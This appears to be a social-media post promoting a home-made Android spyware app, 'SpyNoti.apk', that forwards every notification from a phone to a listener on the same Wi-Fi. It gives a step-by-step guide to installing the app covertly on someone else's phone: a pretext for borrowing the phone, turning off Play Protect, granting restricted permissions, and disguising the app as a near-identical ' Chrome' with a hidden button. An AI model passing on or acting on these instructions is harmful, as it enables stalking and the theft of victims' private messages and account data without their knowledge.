As a fun project, I have created spyware
called "SpyNoti.apk". This app can forward 
all your notifications to someone connected to
the same Wi-Fi network. You just need to put
the receiver's IP address, and you're done.
In this way, I can spy on your Facebook accounts,
and probably Truecaller, WhatsApp, and even email
accounts if you have notification backups turned
on.

Suppose you want to spy on someone.
You can take their phone by telling them your
balance is finished and you need to make a call. After taking the phone, here is what you have to do:

-Turn Play Protect off in the Play Store.

-Go to my GitHub link: 
github.com/Farhan1151/spynoti

-Download the SpyNoti APK.

-Install it.

-Go to Settings > Apps > search for " Chrome" (with a space)
>allow restricted settings, grant all
permissions, untick "manage app if unused,"
and allow it from background autostart
(for Xiaomi phones).

-Go to Chrome, and tap on the bottom right
corner where you will find a hidden button.

-Put your IP in and hit "Test Connection."

You only need 1-2 minutes to do this.
There is notification receiver.apk in
GitHub which will show you the notifications
when you tap on "Start Server"

I named the app " Chrome" (with an extra space
at the beginning). If you open it, it looks
almost identical to the actual Chrome app.
The button is black, making it nearly
invisible on the phone's screen. The user will
never know that you have two Chrome apps
installed on your phone.
